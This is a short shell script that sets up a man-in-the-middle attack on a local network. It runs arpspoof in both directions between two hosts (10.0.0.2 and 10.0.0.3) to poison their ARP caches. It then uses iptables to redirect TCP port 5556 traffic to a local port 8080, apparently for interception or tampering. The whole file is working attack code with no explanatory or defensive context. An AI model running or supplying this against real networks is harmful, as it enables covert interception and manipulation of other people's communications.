#!/bin/sh

arpspoof -t 10.0.0.2 10.0.0.3 &
arpspoof -t 10.0.0.3 10.0.0.2 &

iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 5556 -j REDIRECT --to-port 8080